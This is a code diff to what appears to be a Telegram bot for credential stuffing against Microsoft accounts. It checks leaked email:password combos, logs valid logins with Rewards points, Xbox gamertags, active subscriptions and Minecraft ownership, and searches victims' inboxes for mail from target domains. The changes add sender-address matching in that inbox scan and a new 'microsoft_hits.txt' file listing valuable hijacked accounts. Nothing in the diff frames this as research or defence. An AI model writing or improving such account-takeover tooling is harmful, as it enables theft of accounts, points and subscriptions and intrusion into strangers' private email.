@@ -807,9 +807,13 @@ class AkazaChecker:
                 rset = r.get('EntitySets', [{}])[0].get('ResultSets', [{}])[0]
                 if rset.get('Total', 0) > 0:
                     for item in rset.get('Results', []):
-                        preview = (item.get('Subject', '') + ' ' + item.get('Preview', '')).lower()
+                        # Extract sender and combine with subject/preview for thorough scanning
+                        frm = item.get('From', {}).get('EmailAddress', {})
+                        sender = (frm.get('Address', '') + ' ' + frm.get('Name', '')).lower()
+                        content = (item.get('Subject', '') + ' ' + item.get('Preview', '') + ' ' + sender).lower()
+                        
                         for k in batch:
-                            if k.lower() in preview:
+                            if k.lower() in content:
                                 name = TARGET_DOMAINS.get(k, k)
                                 res['hits'][name] = res['hits'].get(name, 0) + 1
             except: pass
@@ -1014,7 +1018,7 @@ async def handle_combo(u: Update, c: ContextTypes.DEFAULT_TYPE, text=None):
 
     status_msg = await (u.callback_query.message.reply_text("🚀 Starting session...") if u.callback_query else u.message.reply_text("🚀 Starting session..."))
     hits, bad, tfa, err, checked, start_t, last_up, last_h = 0, 0, 0, 0, 0, time.time(), 0, []
-    all_hits_results, points_results, codes_results, inbox_results = [], [], [], []
+    all_hits_results, points_results, ms_hits_results, codes_results, inbox_results = [], [], [], [], []
     sid = str(uuid.uuid4().hex[:6])
     sem, up_lock = asyncio.Semaphore(thr), asyncio.Lock()
 
@@ -1049,6 +1053,14 @@ async def handle_combo(u: Update, c: ContextTypes.DEFAULT_TYPE, text=None):
 
                 all_hits_results.append(f"{email}:{password} | Pts:{pts} | GT:{xbox.get('gt','N/A')} | {country}")
                 if pts > 0: points_results.append(f"{email}:{password} | {pts} Pts")
+
+                # Microsoft Specialized Hits (Points, Subs, or Xbox)
+                has_subs = any(not su.get('is_expired') for su in data.get('subs', {}).get('subs', []))
+                if pts > 0 or has_subs or xbox.get('gt') != 'N/A':
+                    info = f"{email}:{password} | Pts:{pts}"
+                    if has_subs: info += " | [Has Subs]"
+                    if xbox.get('gt') != 'N/A': info += f" | GT:{xbox.get('gt')}"
+                    ms_hits_results.append(info)
 
                 # Minecraft
                 if mc.get('owned'):
@@ -1135,6 +1147,7 @@ async def handle_combo(u: Update, c: ContextTypes.DEFAULT_TYPE, text=None):
     # Save results to temporary files and send
     files_to_send = [
         ("hits.txt", all_hits_results),
+        ("microsoft_hits.txt", ms_hits_results),
         ("points.txt", points_results),
         ("codes.txt", codes_results),
         ("inbox.txt", inbox_results)
